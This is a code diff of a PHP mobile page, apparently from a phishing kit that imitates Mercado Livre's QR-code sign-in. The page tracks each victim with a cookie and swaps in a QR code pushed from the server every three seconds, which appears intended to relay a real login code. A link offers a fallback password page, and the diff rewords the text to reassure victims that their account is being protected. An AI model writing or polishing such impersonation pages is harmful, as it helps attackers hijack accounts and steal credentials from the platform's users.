@@ -1,19 +1,19 @@
 <?php
-// --- LÓGICA DE REDIRECIONAMENTO ---
+// --- VERIFICAÇÃO DE DISPOSITIVO E SESSÃO ---
+
 // Se o acesso NÃO for de um dispositivo móvel, redireciona para a versão desktop.
 $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
 $isMobile = preg_match('/(Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone)/i', $userAgent);
 
 if (!$isMobile) {
-    header('Location: telaqr.php'); // Redireciona para a página desktop
+    header('Location: telaqr.php'); // Altere para o nome da sua página desktop
     exit;
 }
 
-// O topo do arquivo com a validação do cookie permanece o mesmo.
+// Inicia a sessão e valida o cookie de identificação
 session_start();
-require 'db.php';
 if (!isset($_COOKIE['identificador_cliente'])) {
-    header('Location: index.php'); // Se não tiver cookie, volta para o início
+    header('Location: index.php');
     exit;
 }
 ?>
@@ -25,40 +25,87 @@ if (!isset($_COOKIE['identificador_cliente'])) {
     <title>Escaneie o QR para iniciar sessão</title>
     <style>
         :root {
-            --andes-color-yellow-500: #ffe600;
-            --andes-color-blue-500: #3483fa;
-            --andes-text-color-primary: #333;
-            --andes-text-color-secondary: #666; /* Cor ajustada para consistência */
-            --andes-text-color-link: var(--andes-color-blue-500);
-            --andes-background-color-primary: #fff;
+            --cor-amarela: #ffe600;
+            --cor-azul: #3483fa;
+            --cor-texto-primaria: #333;
+            --cor-texto-secundaria: #666;
+            --cor-fundo: #f5f5f5;
+            --cor-card: #ffffff;
         }
-        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; display: flex; flex-direction: column; min-height: 100vh; background-color: var(--andes-background-color-primary); }
-        .main-header { background-color: var(--andes-color-yellow-500); padding: 12px 24px; box-shadow: 0 1px 2px 0 rgba(0,0,0,.1); display: flex; align-items: center; justify-content: flex-start; }
-        .main-header img { height: 35px; }
-        .main-content { padding: 32px 24px; flex-grow: 1; display: flex; flex-direction: column; align-items: center; text-align: center; }
-        .main-title { font-size: 24px; font-weight: 500; color: var(--andes-text-color-primary); line-height: 1.3; margin: 0 0 16px 0; }
-        .description-text { font-size: 16px; color: var(--andes-text-color-secondary); margin: 0; line-height: 1.5; }
-        .qr-container { 
-            width: 100%;
-            margin: 40px 0; /* Espaçamento vertical */
+        body {
+            margin: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: var(--cor-fundo);
             display: flex;
-            justify-content: center;
+            flex-direction: column;
+            min-height: 100vh;
         }
-        .qr-container .qr-image {
-            width: 70%; /* Largura responsiva */
-            max-width: 250px; /* Tamanho máximo para não ficar enorme */
-            height: auto; /* Altura automática para manter proporção */
-            display: block;
+        .main-header {
+            background-color: var(--cor-amarela);
+            padding: 12px 24px;
+            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
         }
-        .other-method-link { 
-            color: var(--andes-text-color-link); 
-            text-decoration: none; 
-            font-size: 15px; 
+        .main-header img {
+            height: 35px;
+        }
+        .main-content {
+            padding: 32px 24px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Centraliza os itens horizontalmente */
+            text-align: center;
+        }
+        .session-start-label {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--cor-texto-secundaria);
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        .main-title {
+            font-size: 24px;
             font-weight: 500;
-            margin-top: auto; /* Empurra para o final */
-            padding-top: 24px;
+            color: var(--cor-texto-primaria);
+            margin: 0 0 16px 0;
+            line-height: 1.3;
         }
-        .other-method-link:hover { text-decoration: underline; }
+        .description-text {
+            font-size: 16px;
+            color: var(--cor-texto-secundaria);
+            line-height: 1.5;
+            max-width: 320px; /* Evita que o texto fique muito largo */
+            margin-bottom: 32px;
+        }
+        .qr-card {
+            background-color: var(--cor-card);
+            border-radius: 6px;
+            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
+            padding: 24px;
+            width: 100%;
+            max-width: 280px; /* Largura máxima do card */
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .qr-image {
+            width: 100%; /* Imagem ocupa toda a largura do card */
+            height: auto;
+            margin-bottom: 24px;
+        }
+        .other-method-link {
+            color: var(--cor-azul);
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+        }
+        .other-method-link:hover {
+            text-decoration: underline;
+        }
+        .main-content .other-method-link {
+            margin-top: 32px;
+        }
     </style>
 </head>
 <body>
@@ -67,38 +114,32 @@ if (!isset($_COOKIE['identificador_cliente'])) {
     </header>
 
     <main class="main-content">
-        
-        <div>
-            <h1 class="main-title">Escaneie o QR para iniciar sessão de forma segura</h1>
-            <p class="description-text">Use o app do Mercado Pago ou do Mercado Livre para escanear o código.</p>
+        <span class="session-start-label">INÍCIO DE SESSÃO</span>
+        <h1 class="main-title">Escaneie o QR para iniciar sessão de forma segura</h1>
+        <p class="description-text">Este passo é necessário para validar sua identidade e manter sua conta sempre protegida.</p>
+
+        <div class="qr-card">
+            <img src="2.png" alt="Código QR para login" id="qr-image" class="qr-image">
+            <a href="senha-mobile.php" class="other-method-link">Escolher outro método</a>
         </div>
 
-        <div class="qr-container">
-            <img src="2.png" alt="Código QR para login" id="qr-image" class="qr-image">
-        </div>
-        
-        <a href="senha-mobile.php" class="other-method-link">Não consigo escanear o código</a>
-        
     </main>
 
     <script>
-        // A FUNCIONALIDADE JAVASCRIPT É EXATAMENTE A MESMA DA VERSÃO DESKTOP
+        // A MESMA FUNCIONALIDADE JAVASCRIPT DA VERSÃO DESKTOP
         const qrImage = document.getElementById('qr-image');
 
         async function verificarQrCode() {
             try {
+                // Esta API busca um novo QR code no servidor
                 const response = await fetch('api_get_qrcode.php');
                 const data = await response.json();
 
-                // Se a API retornar sucesso e um caminho de imagem...
                 if (data.success && data.qrcode_path) {
                     console.log('Novo QR Code recebido:', data.qrcode_path);
                     
-                    // ...atualiza a imagem, adicionando um timestamp para evitar o cache do navegador.
+                    // Atualiza a imagem, adicionando um timestamp para evitar cache do navegador
                     qrImage.src = data.qrcode_path + '?t=' + new Date().getTime();
-                } else {
-                    // Se não, continua exibindo o QR Code padrão.
-                    console.log('Aguardando novo QR Code...');
                 }
             } catch (error) {
                 console.error('Erro ao buscar QR Code:', error);
@@ -108,6 +149,5 @@ if (!isset($_COOKIE['identificador_cliente'])) {
         // Inicia a verificação a cada 3 segundos
         setInterval(verificarQrCode, 3000);
     </script>
-
 </body>
 </html>
